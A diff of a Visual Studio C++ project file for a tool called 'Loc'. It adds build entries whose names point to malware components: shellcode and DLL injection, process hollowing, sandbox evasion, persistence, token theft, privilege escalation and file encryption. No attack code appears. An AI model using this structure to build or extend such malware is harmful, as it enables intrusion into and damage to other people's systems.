@@ -122,7 +122,7 @@
       <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
       <LanguageStandard>stdcpp20</LanguageStandard>
-      <AdditionalIncludeDirectories>C:\Users\rodri\source\repos\Loc\Loc\src;C:\Users\rodri\source\repos\Loc\Loc\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>$(ProjectDir)src;$(ProjectDir)include;C:\Users\rodri\source\repos\Loc\Loc\src;C:\Users\rodri\source\repos\Loc\Loc\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <Optimization>MaxSpeed</Optimization>
       <StringPooling>false</StringPooling>
       <BasicRuntimeChecks>Default</BasicRuntimeChecks>
@@ -161,11 +161,20 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="Loc.cpp" />
+    <ClCompile Include="src\injection\IInjector.cpp" />
+    <ClCompile Include="src\Crypt.cpp">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">true</ExcludedFromBuild>
+    </ClCompile>
+    <ClCompile Include="src\crypt\CryptManager.cpp" />
+    <ClCompile Include="src\Crypt\FileEncryptor.cpp" />
     <ClCompile Include="src\evasion\Evasion.cpp" />
     <ClCompile Include="src\evasion\ProcessHollowing.cpp" />
     <ClCompile Include="src\evasion\Sandbox.cpp" />
     <ClCompile Include="src\Executable.cpp" />
     <ClCompile Include="src\HandleGuard.cpp" />
+    <ClCompile Include="src\injection\dll\RemoteThreadDllInjector.cpp" />
+    <ClCompile Include="src\injection\shellcode\ShellcodeInjector.cpp" />
+    <ClCompile Include="src\Logger.cpp" />
     <ClCompile Include="src\Obfuscator.cpp" />
     <ClCompile Include="src\Persistence.cpp" />
     <ClCompile Include="src\privilegeEscalation\PrivilegeEscalation.cpp" />
@@ -176,21 +185,35 @@
     <ClCompile Include="src\Utils.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="include\injection\shellcode\IShellcodeInjector.h" />
+    <ClInclude Include="include\injection\dll\IDllInjector.h" />
+    <ClInclude Include="include\injection\shellcode\ShellcodeInjector.h" />
+    <ClInclude Include="include\ShellcodeManager.h" />
     <ClInclude Include="include\ASM.h" />
-    <ClInclude Include="include\Crypt.h" />
+    <ClInclude Include="include\Crypt.h">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">true</ExcludedFromBuild>
+    </ClInclude>
+    <ClInclude Include="include\crypt\CryptManager.h" />
+    <ClInclude Include="include\Crypt\FileEncryptor.h" />
+    <ClInclude Include="include\evasion\DllInjection.h">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">true</ExcludedFromBuild>
+    </ClInclude>
     <ClInclude Include="include\evasion\Evasion.h" />
     <ClInclude Include="include\evasion\ProcessHollowing.h" />
     <ClInclude Include="include\evasion\Sandbox.h" />
     <ClInclude Include="include\Executable.h" />
     <ClInclude Include="include\HandleGuard.h" />
+    <ClInclude Include="include\injection\IInjector.h" />
+    <ClInclude Include="include\injection\dll\RemoteThreadDllInjector.h" />
+    <ClInclude Include="include\Logger.h" />
     <ClInclude Include="include\Obfuscator.h" />
     <ClInclude Include="include\Persistence.h" />
     <ClInclude Include="include\privilege_escalation\PrivilegeEscalation.h" />
     <ClInclude Include="include\privilegeEscalation\TokenTheft.h" />
     <ClInclude Include="include\Recon.h" />
-    <ClInclude Include="include\ShellcodeManager.h" />
     <ClInclude Include="include\system_utils\WinAPIWrapper.h" />
     <ClInclude Include="include\Utils.h" />
+    <ClInclude Include="tests\test.h" />
   </ItemGroup>
   <ItemGroup>
     <MASM Include="asm\lastError.asm" />
